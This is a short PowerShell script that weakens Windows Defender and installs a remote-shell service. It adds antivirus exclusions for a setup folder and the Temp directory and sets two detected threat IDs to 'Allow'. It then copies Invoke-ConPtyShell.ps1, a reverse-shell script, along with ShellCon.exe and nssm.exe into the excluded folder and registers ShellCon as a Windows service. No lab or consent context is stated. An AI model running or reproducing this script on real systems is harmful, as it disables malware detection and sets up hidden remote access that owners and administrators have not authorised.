#threats to be allowed
$threat1 = "2147773719"
$threat2 = "2147780248"

#add Windows Defender Exclusions:
$TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
    Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, $TempExcl

#add allowed threats
Add-MpPreference -ThreatIDDefaultAction_Ids $threat1 -ThreatIDDefaultAction_Actions Allow -Force
Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Actions Allow -Force

#copy connection script:
Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1

#copy service exe:
Copy-Item -Path Z:\ShellCon.exe -Destination C:\Windows\Setup\State\ShellCon.exe

#copy nssm.exe
Copy-Item -Path Z:\nssm.exe -Destination C:\Windows\Setup\State\nssm.exe

#create service:
$ServiceName = "ShellCon"
$ExecPath = "C:\Windows\Setup\State\ShellCon.exe"
$AppDirectory = "C:\Windows\Setup\State"

nssm install $ServiceName $ExecPath
nssm set $ServiceName AppDirectory $AppDirectory
nssm set $ServiceName Start SERVICE_DEMAND_START
nssm set $ServiceName AppStopMethodConsole 30000